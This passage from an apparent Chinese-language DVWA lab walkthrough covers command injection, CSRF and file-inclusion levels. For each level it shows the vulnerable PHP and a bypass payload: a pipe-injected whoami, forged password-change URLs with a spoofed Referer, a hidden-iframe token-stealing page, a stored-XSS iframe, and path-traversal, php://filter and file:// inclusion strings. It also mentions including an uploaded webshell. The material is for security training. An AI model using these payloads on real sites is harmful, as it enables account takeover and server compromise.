<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = trim($_REQUEST[ <span class="string">'ip'</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    $substitutions = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'| '</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'-'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'$'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'('</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">')'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'`'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'||'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>增加了黑名单，但是还是有过滤不全，这个黑名单看到过滤了<code>|</code> 但是却没有过滤<code>|</code> （没有空格）<br>黑名单过滤不全，所以<br>payload:<code>127.0.0.1|whoami</code></p>
<h3 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">'ip'</span> ];</span><br><span class="line">    $target = stripslashes( $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">    $octet = explode( <span class="string">"."</span>, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">    <span class="keyword">if</span>( ( is_numeric( $octet[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( $octet ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int's put the IP back together.</span></span><br><span class="line">        $target = $octet[<span class="number">0</span>] . <span class="string">'.'</span> . $octet[<span class="number">1</span>] . <span class="string">'.'</span> . $octet[<span class="number">2</span>] . <span class="string">'.'</span> . $octet[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>函数说明:<br><figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">checkToken</span>()  进行<span class="variable">token</span>验证</span></span><br><span class="line"><span class="function"><span class="title">stripslashes</span>()  删除反斜杠</span></span><br><span class="line"><span class="function"><span class="title">explode</span>()  把字符串打散为数组</span></span><br><span class="line"><span class="function"><span class="title">is_numeric</span>()  判断是否为数字或数字字符串</span></span><br><span class="line"><span class="function"><span class="title">generateSessionToken</span>();  生成反<span class="variable">CSRF</span>令牌</span></span><br></pre></td></tr></table></figure><br>这样命令注入的漏洞就成功修复了</p>
<h2 id="CSRF-1"><a href="#CSRF-1" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到没有任何验证，所以先输入123，123<br>得到<code>http://localhost/DVWA/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</code></p>
<p>我们将这个url修改成自己的<code>http://localhost/DVWA/vulnerabilities/csrf/?password_new=abc&amp;password_conf=abc&amp;Change=Change#</code></p>
<p>再构造一个html，待用户访问时，密码就已经被修改了</p>
<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( stripos( $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ,$_SERVER[ <span class="string">'SERVER_NAME'</span> ]) !== <span class="keyword">false</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">        $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">            $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn't come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>看到加入了Referer的验证，该验证必须要求用户的请求头中的Referer字段必须包含了服务器的名字</p>
<p>所以我们bp抓包获取一下Referer的信息<br><code>Referer: http://localhost/DVWA/vulnerabilities/csrf/</code></p>
<p>直接重新打开一个页面访问<code>http://localhost/DVWA/vulnerabilities/csrf/?password_new=abc&amp;password_conf=abc&amp;Change=Change#</code><br>抓包，在请求头添加<code>Referer:http://localhost/ahhaha</code>,只要有localhost即可</p>
<p>放包，显示修改成功</p>
<h3 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到，High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器都会返回一个随机的token，当浏览器向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p>
<p>所以现在要想进行CSRF攻击就必须获取到用户的token，而要想获取到 token 就必须利用用户的 cookie 值去访问修改密码的页面，然后截取服务器返回的token值。然后再利用CSRF漏洞构造URL进行密码的修改。</p>
<p>我们尝试利用下面的代码去构造一个页面，诱使用户点击，当用户点击该链接的这一刻，该代码会偷偷的访问修改用户密码的页面，然后获取到服务器返回的 token ，然后再构造修改密码的表单，加上我们获取到服务器的token值，向服务器发送修改密码的请求。<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//获取用户的token，并设置为表单中的token，然后提交修改密码的表单</span></span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">attack</span><span class="params">()</span></span></span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value=<span class="built_in">document</span>.getElementById(<span class="string">"hack"</span>).contentWindow.document.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">"transfer"</span>).submit();</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"attack()"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1/dvwa/vulnerabilities/csrf/"</span> <span class="attr">id</span>=<span class="string">"hack"</span>  <span class="attr">style</span>=<span class="string">"display:none;"</span>&gt;</span>  <span class="comment">&lt;!--在该网页内打开另一个网页--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"GET"</span> <span class="attr">id</span>=<span class="string">"transfer"</span>  <span class="attr">action</span>=<span class="string">"http://127.0.0.1/dvwa/vulnerabilities/csrf/"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_new"</span> <span class="attr">value</span>=<span class="string">"admin"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_conf"</span> <span class="attr">value</span>=<span class="string">"admin"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user_token"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这一切看起来是那么的天衣无缝，无懈可击。可是，我们忘记了浏览器最重要的一个策略——同源策略。由于我们框架ifame要访问的链接是 <a href="http://127.0.0.1/dvwa/vulnerabilities/csrf" target="_blank" rel="noopener">http://127.0.0.1/dvwa/vulnerabilities/csrf</a> ，这是漏洞网站服务器的链接。而我们的脚本执行的位置是我们自己搭的一个服务器，所以我们的攻击脚本是不可能跨域取到改密界面中的user_token。关于同源策略和跨域问题：浏览器同源策略和跨域的实现方法</p>
<p>由于这里跨域是不能实现的，所以我们之前的想法以失败告终了。</p>
<p>在这里，我们要想获取到用户的token,并提交修改密码的表单的话，就必须得把我们的攻击脚本注入到目标服务器中 。而要想注入到目标服务器，同时得发挥作用，获取用户的 token修改密码的话，就得和XSS漏洞一起结合实现了。</p>
<p>我们将如下代码通过存储型XSS插入到数据库中，这语句会弹出用户的token<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"../csrf/"</span> <span class="attr">onload</span>=<span class="string">alert(frames[0].document.getElementsByName(</span>'<span class="attr">user_token</span>')[<span class="attr">0</span>]<span class="attr">.value</span>)&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_curr = $_GET[ <span class="string">'password_current'</span> ];</span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise current password input</span></span><br><span class="line">    $pass_curr = stripslashes( $pass_curr );</span><br><span class="line">    $pass_curr = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_curr ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $pass_curr = md5( $pass_curr );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that the current password is correct</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':password'</span>, $pass_curr, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do both new passwords match and does the current password match the user?</span></span><br><span class="line">    <span class="keyword">if</span>( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == <span class="number">1</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// It does!</span></span><br><span class="line">        $pass_new = stripslashes( $pass_new );</span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database with new password</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'UPDATE users SET password = (:password) WHERE user = (:user);'</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':password'</span>, $pass_new, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在High的基础上，添加了修改密码前需要输入原来的密码，黑客不知道原来的密码，并且使用了PDO和预编译防止了SQL注入，这样就修复了CSRF漏洞</p>
<h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><h3 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到很简单的语句，没有进行任何的过滤和限制，所以我们直接包含根目录下的flag.txt<br>payload:<code>../../../flag.txt</code></p>
<h3 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"http://"</span>, <span class="string">"https://"</span> ), <span class="string">""</span>, $file );</span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"../"</span>, <span class="string">"..\""</span> ), <span class="string">""</span>, $file );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到将<code>../</code>,<code>..\</code>,<code>http://</code>,<code>https://</code>转换为空</p>
<p>我们可以考虑使用伪协议读取,由于str_replace是很不安全的，可以使用双写绕过，除了本地包含，还可以直接包含远程的一句话，直接菜刀<br>payload:<code>php://filter/read=convert.base64-encode/resource=hthttp://tp://localhost/flag.txt</code></p>
<h3 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">"file*"</span>, $file ) &amp;&amp; $file != <span class="string">"include.php"</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn't the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>fnmatch()</code>函数根据指定的模式来匹配文件名或字符串<br>也就是只匹配file1,file2,file3这一类的，或者$file是include.php</p>
<p>想到file，我们可以使用file协议来读取本地的文件</p>
<p>payload:<code>?page=file:///F:/phpstudy_pro/WWW/flag.txt</code></p>
<p>实战的思路就是配合上传漏洞，将一句话木马上传之后，进行包含</p>
